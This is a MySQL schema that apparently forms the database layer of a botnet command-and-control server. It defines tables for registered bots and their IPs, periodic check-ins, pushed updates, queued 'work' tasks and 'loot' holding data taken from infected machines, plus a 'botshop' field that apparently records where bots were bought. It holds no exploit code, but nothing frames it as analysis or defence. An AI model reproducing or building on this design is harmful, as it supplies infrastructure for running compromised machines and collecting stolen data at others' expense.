
CREATE TABLE `bots` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `name` varchar(256) DEFAULT NULL,
  `timestamp` datetime DEFAULT NULL,
  `ip` varchar(16) DEFAULT NULL,
  `botshop` varchar(256) DEFAULT NULL,
  `uuid` varchar(256) DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=MyISAM AUTO_INCREMENT=9 DEFAULT CHARSET=latin1;

CREATE TABLE `checkin` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `name` varchar(256) DEFAULT NULL,
  `ip` varchar(16) DEFAULT NULL,
  `timestamp` datetime DEFAULT NULL,
  `uuid` varchar(256) DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=MyISAM AUTO_INCREMENT=456 DEFAULT CHARSET=latin1;

CREATE TABLE `updates` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `name` varchar(256) DEFAULT NULL,
  `version` varchar(256) DEFAULT NULL,
  `timestamp` datetime DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=MyISAM AUTO_INCREMENT=456 DEFAULT CHARSET=latin1;

CREATE TABLE `updates_log` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `update_id`  int(11),
  `timestamp` datetime DEFAULT NULL,
  `uuid` varchar(256) DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=MyISAM AUTO_INCREMENT=456 DEFAULT CHARSET=latin1;

CREATE TABLE `loot` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `name` varchar(256) DEFAULT NULL,
  `data` TEXT DEFAULT NULL,
  `timestamp` datetime DEFAULT NULL,
  `uuid` varchar(256) DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=MyISAM AUTO_INCREMENT=456 DEFAULT CHARSET=latin1;

CREATE TABLE `work` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `name` varchar(256) DEFAULT NULL,
  `work` TEXT DEFAULT NULL,
  `timestamp` datetime DEFAULT NULL,
  `counter` int(11),
  `max` int(11),
  `alive` BOOLEAN DEFAULT TRUE,
  PRIMARY KEY (`id`)
) ENGINE=MyISAM AUTO_INCREMENT=456 DEFAULT CHARSET=latin1;

